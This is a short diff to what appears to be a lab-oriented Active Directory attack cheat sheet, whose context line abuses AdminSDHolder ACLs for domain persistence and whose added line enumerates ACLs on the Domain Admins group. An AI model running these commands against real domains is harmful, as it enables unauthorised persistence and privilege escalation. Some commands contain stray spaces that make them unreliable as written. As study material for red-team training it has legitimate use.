@@ -278,3 +278,7 @@ https://rzemieniecki.wordpress.com/2019/08/02/evading-edr-av-software-with-invok
 
 ```Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=bcorp,DC=ecorp,D C=lab' -Principal student1 -Verbose``` - AD Module
 
+Check ACLs:
+
+```Get-ObjectAcl -SamAccountName "Domain Admins" - ResolveGUIDs | ?{$_.IdentityReference -match 'Josh'}```
+
